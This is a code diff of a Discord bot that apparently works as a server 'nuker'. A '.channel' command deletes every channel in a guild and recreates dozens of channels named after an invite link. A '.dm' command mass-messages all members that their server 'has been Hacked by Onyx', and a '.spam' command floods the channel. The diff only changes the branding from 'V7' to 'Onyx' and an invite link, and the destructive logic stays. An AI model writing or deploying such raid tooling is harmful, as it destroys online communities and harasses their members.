@@ -9,55 +9,38 @@ bot.on("ready", () => {
 bot.on("message", function(message){
     if(message.content == ".channel"){
         message.guild.channels.forEach(channel => channel.delete())
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-        message.guild.createChannel("Hacked by V7", "Hacked by V7");
-		
+        message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
+	    message.guild.createChannel("discord.gg/uEg29G", "discord.gg/uEg29G");
     }
 
     bot.on("message", function(message){
@@ -70,22 +53,22 @@ bot.on("message", function(message){
     bot.on("message", function(message){
         if(message.content == ".dm"){
             bot.guilds.get(message.guild.id).members.forEach(members1 => {
-                members1.send("**" + message.guild.name + " 's server has been Hacked by V7**")
+                members1.send("**" + message.guild.name + " 's server has been Hacked by Onyx**")
             })
         }
     })
 
     bot.on("message", function(mesasge){
         if(message.content == ".spam"){
-            message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
-		message.channel.send("**Hacked By V7**")
+            message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
+		message.channel.send("**Hacked by Onyx**")
 		
         }
     })
